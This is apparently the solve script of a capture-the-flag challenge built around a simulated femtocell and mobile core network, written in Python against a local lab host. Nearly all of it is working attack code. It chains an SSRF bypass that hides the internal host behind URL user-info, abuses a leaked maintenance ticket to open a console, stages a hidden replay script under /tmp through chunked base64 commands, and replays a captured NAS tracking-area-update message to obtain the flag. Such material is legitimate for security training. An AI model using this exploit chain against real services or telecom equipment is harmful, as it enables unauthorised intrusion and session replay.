#!/usr/bin/env python3
"""Solve the isolated femtocell CTF through its public HTTP interface.

Usage:
    python3 solve.py --base-url http://127.0.0.1:58080
"""

from __future__ import annotations

import argparse
import base64
import html
import json
import re
import sys
import time
from http.cookiejar import CookieJar
from pathlib import Path
from typing import Any
from urllib import error as urlerror
from urllib.parse import urlencode
from urllib.request import HTTPCookieProcessor, Request, build_opener


JOB_ID = 8427
MAX_CONSOLE_COMMAND = 512
CHUNK_SIZE = 280
FLAG_RE = re.compile(r"ctfcup\{[^}\r\n]{1,200}\}")
HEX_RE = re.compile(r"[0-9a-fA-F]+")
M_TMSI_RE = re.compile(r"0x[0-9a-fA-F]{8}")
SAFE_FILE_RE = re.compile(r"[A-Za-z0-9][A-Za-z0-9._-]{0,127}")


class SolveError(RuntimeError):
    pass


class Client:
    def __init__(self, base_url: str, timeout: float) -> None:
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.opener = build_opener(HTTPCookieProcessor(CookieJar()))

    def request(self, path: str, *, form: dict[str, str] | None = None) -> tuple[int, str]:
        data = None
        headers: dict[str, str] = {}
        if form is not None:
            data = urlencode(form).encode("utf-8")
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        request = Request(f"{self.base_url}{path}", data=data, headers=headers)
        try:
            with self.opener.open(request, timeout=self.timeout) as response:
                return int(response.status), response.read().decode("utf-8", errors="replace")
        except urlerror.HTTPError as error:
            return int(error.code), error.read().decode("utf-8", errors="replace")

    def support_job(self) -> dict[str, Any]:
        # The literal prefix passes the flawed check; urlsplit() uses
        # femto-agent as the actual authority after parsing user-info.
        target = f"http://mme-monitor@femto-agent:8081/v1/jobs/{JOB_ID}"
        status, body = self.request(
            "/api/diagnostics/connectivity-test?" + urlencode({"target": target})
        )
        if status != 200:
            raise SolveError(f"SSRF endpoint returned HTTP {status}: {body[:300]}")
        try:
            outer = json.loads(body)
            job = json.loads(outer["body"])
        except (KeyError, TypeError, json.JSONDecodeError) as error:
            raise SolveError("could not decode internal support job") from error
        if outer.get("status") != 200 or not isinstance(job, dict):
            raise SolveError(f"internal agent response is not a job: {outer!r}")
        return job

    def wait_for_context(self, wait: float) -> dict[str, Any]:
        deadline = time.monotonic() + wait
        last_error = ""
        while time.monotonic() < deadline:
            try:
                job = self.support_job()
                if job.get("state") == "periodic-tau-captured":
                    return job
                last_error = f"current state is {job.get('state')!r}"
            except (OSError, SolveError, ValueError) as error:
                last_error = str(error)
            time.sleep(0.5)
        raise SolveError(f"TAU context was not published within {wait:g}s ({last_error})")

    def unlock_console(self, ticket: str) -> None:
        status, page = self.request("/maintenance", form={"ticket": ticket})
        if status != 200 or "maintenance console" not in page.lower():
            raise SolveError("maintenance ticket did not unlock the console")

    def command(self, command: str) -> str:
        if len(command) > MAX_CONSOLE_COMMAND:
            raise SolveError(f"console command is too long ({len(command)} bytes)")
        status, page = self.request("/maintenance/console", form={"command": command})
        if status != 200:
            raise SolveError(f"console returned HTTP {status}")
        return html.unescape(page)

    def collect_tau_pdu(self, job: dict[str, Any]) -> tuple[str, str]:
        m_tmsi = job.get("m_tmsi")
        cache_name = job.get("nas_log")
        if not isinstance(m_tmsi, str) or not M_TMSI_RE.fullmatch(m_tmsi):
            raise SolveError("job contains no valid M-TMSI")
        if not isinstance(cache_name, str) or not SAFE_FILE_RE.fullmatch(cache_name):
            raise SolveError("job contains an invalid diagnostics filename")

        output = self.command(
            f"curl --fail --silent http://mme-log-relay:8082/v1/diagnostics/{cache_name}"
        )
        for line in output.splitlines():
            fields = dict(token.split("=", 1) for token in line.split() if "=" in token)
            if fields.get("m_tmsi", "").lower() != m_tmsi.lower():
                continue
            nas_pdu_hex = fields.get("nas_pdu_hex", "")
            if len(nas_pdu_hex) >= 16 and len(nas_pdu_hex) % 2 == 0 and HEX_RE.fullmatch(nas_pdu_hex):
                return m_tmsi.lower(), nas_pdu_hex.lower()
        raise SolveError("no valid TAU trace matching the support-job M-TMSI was found")

    def stage_replayer(self, script: bytes) -> str:
        target = "/tmp/.field-replay.py"
        self.command(f": > {target}")
        for offset in range(0, len(script), CHUNK_SIZE):
            encoded = base64.b64encode(script[offset : offset + CHUNK_SIZE]).decode("ascii")
            command = (
                "python3 -c \"import base64;open('"
                f"{target}','ab').write(base64.b64decode('{encoded}'))\""
            )
            self.command(command)
        self.command(f"chmod 700 {target}")
        return target


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    parser.add_argument("--wait", type=float, default=90.0, help="seconds to wait for the fixture TAU")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.wait <= 0:
        raise SolveError("--wait must be positive")
    replayer = Path(__file__).with_name("replay.py")
    try:
        script = replayer.read_bytes()
    except OSError as error:
        raise SolveError(f"cannot read {replayer}: {error}") from error

    client = Client(args.base_url, timeout=5.0)
    job = client.wait_for_context(args.wait)
    ticket = job.get("maintenance_ticket")
    if not isinstance(ticket, str) or not ticket:
        raise SolveError("support job contains no maintenance ticket")
    client.unlock_console(ticket)
    m_tmsi, nas_pdu_hex = client.collect_tau_pdu(job)
    remote_replayer = client.stage_replayer(script)
    output = client.command(
        f"python3 {remote_replayer} --m-tmsi {m_tmsi} --nas-pdu-hex {nas_pdu_hex}"
    )
    flag = FLAG_RE.search(output)
    if flag is None:
        raise SolveError(f"replayer did not return a flag:\n{output[-4000:]}")
    print(flag.group(0))
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except SolveError as error:
        print(f"solve failed: {error}", file=sys.stderr)
        raise SystemExit(1)
